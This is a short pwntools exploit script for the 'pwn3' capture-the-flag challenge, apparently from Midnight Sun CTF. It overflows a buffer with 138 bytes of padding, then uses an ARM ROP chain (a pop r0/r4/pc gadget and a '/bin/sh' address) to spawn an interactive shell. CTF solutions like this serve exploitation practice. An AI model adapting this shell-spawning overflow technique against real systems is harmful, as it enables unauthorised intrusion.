from pwn import *
context.binary = './pwn3'
#io=remote("pwn3-01.play.midnightsunctf.se",10003)                      
io = gdb.debug(context.binary.path)
binsh = 0x00049018
pop_r0_r4_pc = 0x0001fb5c
payload = 'a'*138 + p32(pop_r0_r4_pc) + p32(binsh)*2 + p32(0x1480c)
io.sendlineafter("buffer: ",payload)
io.interactive()
